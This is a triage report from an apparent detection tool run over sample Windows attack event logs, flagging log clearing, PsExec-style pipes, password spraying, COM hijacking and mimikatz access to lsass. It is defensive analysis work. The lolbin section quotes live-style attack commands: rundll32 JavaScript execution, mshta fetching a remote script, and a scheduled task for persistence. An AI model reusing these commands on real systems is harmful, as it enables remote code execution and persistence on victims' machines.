# EVTX triage findings

## CA_4624_4625_LogonType2_LogonProc_chrome.evtx
records=4 parse_errors=0 event_ids={4624: 3, 4625: 1}

- no findings

## DE_1102_security_log_cleared.evtx
records=112 parse_errors=0 event_ids={4663: 110, 1102: 1, 5156: 1}

- **[high] security_log_cleared** (T1070.001) 2019-03-19 23:35:07.524200+00:00 - Security log cleared by ?

## DE_Fake_ComputerAccount_4720.evtx
records=2 parse_errors=0 event_ids={4720: 2}

- **[medium] computer_account_via_4720** (T1136.002) 2020-09-16 09:31:19.133272+00:00 - 01566S-WIN16-IR$ created account $ (machine-style name via user-creation API)
- **[medium] computer_account_via_4720** (T1136.002) 2020-09-16 09:32:13.647154+00:00 - 01566S-WIN16-IR$ created account $ (machine-style name via user-creation API)

## DE_renamed_psexec_service_sysmon_17_18.evtx
records=11 parse_errors=0 event_ids={18: 7, 17: 4}

- **[high] psexec_like_named_pipe** (T1569.002) 2020-09-27 13:42:01.092665+00:00 - pipe \svchost-MSEDGEWIN10-8116-stdin by C:\Windows\svchost.exe
- **[high] psexec_like_named_pipe** (T1569.002) 2020-09-27 13:42:01.093184+00:00 - pipe \svchost-MSEDGEWIN10-8116-stdout by C:\Windows\svchost.exe
- **[high] psexec_like_named_pipe** (T1569.002) 2020-09-27 13:42:01.093922+00:00 - pipe \svchost-MSEDGEWIN10-8116-stderr by C:\Windows\svchost.exe
- **[high] psexec_like_named_pipe** (T1569.002) 2020-09-27 13:42:01.182772+00:00 - pipe \svchost-MSEDGEWIN10-8116-stdin by C:\Windows\system32\PsExec.exe
- **[high] psexec_like_named_pipe** (T1569.002) 2020-09-27 13:42:01.182880+00:00 - pipe \svchost-MSEDGEWIN10-8116-stdout by C:\Windows\system32\PsExec.exe
- **[high] psexec_like_named_pipe** (T1569.002) 2020-09-27 13:42:01.182989+00:00 - pipe \svchost-MSEDGEWIN10-8116-stderr by C:\Windows\system32\PsExec.exe

## LM_WMI_4624_4688_TargetHost.evtx
records=8 parse_errors=0 event_ids={4624: 6, 4688: 2}

- **[medium] wmi_child_process** (T1047) 2019-03-18 22:15:49.676748+00:00 - WmiPrvSE spawned C:\Windows\System32\calc.exe (remote WMI exec?)

## LM_renamed_psexecsvc_5145.evtx
records=22 parse_errors=0 event_ids={5145: 22}

- **[high] psexec_like_pipe_over_smb** (T1569.002) 2019-01-19 13:00:10.711208+00:00 - 10.0.2.16 opened IPC$ pipe 'blabla-NLLT108334-37048-stdin' as IEUser
- **[high] psexec_like_pipe_over_smb** (T1569.002) 2019-01-19 13:00:10.711208+00:00 - 10.0.2.16 opened IPC$ pipe 'blabla-NLLT108334-37048-stdout' as IEUser
- **[high] psexec_like_pipe_over_smb** (T1569.002) 2019-01-19 13:00:10.711208+00:00 - 10.0.2.16 opened IPC$ pipe 'blabla-NLLT108334-37048-stderr' as IEUser

## Powershell_4104_MiniDumpWriteDump_Lsass.evtx
records=4 parse_errors=0 event_ids={40961: 1, 53504: 1, 40962: 1, 4104: 1}

- **[high] suspicious_scriptblock** (T1059.001) 2020-06-30 14:24:08.254604+00:00 - PowerShell script block contains ['MiniDumpWriteDump']

## exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx
records=8 parse_errors=0 event_ids={1: 4, 3: 3, 11: 1}

- **[high] lolbin_proxy_exec** (T1218) 2019-05-21 15:32:57.286253+00:00 - C:\Windows\System32\rundll32.exe: rundll32.exe  javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%%20ActiveXObject("WScript.Shell").run("
- **[high] lolbin_proxy_exec** (T1218) 2019-05-21 15:32:57.867088+00:00 - C:\Windows\System32\mshta.exe: "C:\Windows\System32\mshta.exe" https://hotelesms.com/talsk.txt
- **[medium] scheduled_task_created** (T1053.005) 2019-05-21 15:32:59.769825+00:00 - "C:\Windows\System32\schtasks.exe" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR "mshta.exe https://hotelesms.com/Injection.txt" /F

## kerberos_pwd_spray_4771.evtx
records=12 parse_errors=0 event_ids={4768: 9, 4771: 2, 1102: 1}

- **[high] security_log_cleared** (T1070.001) 2020-07-22 20:29:27.321770+00:00 - Security log cleared by ?
- **[high] password_spray** (T1110.003) 2020-07-22 20:29:36.414827+00:00 - 9 failures across 9 accounts from kerb:172.16.66.1

## persist_firefox_comhijack_sysmon_11_13_7_1.evtx
records=19 parse_errors=0 event_ids={1: 10, 13: 3, 11: 2, 10: 2, 7: 2}

- **[high] com_hijack_hkcu** (T1546.015) 2019-05-21 00:35:07.474159+00:00 - C:\Users\IEUser\Downloads\com-hijack.exe set HKU\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32\(Default) = C:\ProgramData\demo.dll

## sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx
records=1 parse_errors=0 event_ids={10: 1}

- **[critical] lsass_access** (T1003.001) 2019-03-17 19:37:11.661928+00:00 - C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe opened lsass with 0x00001010
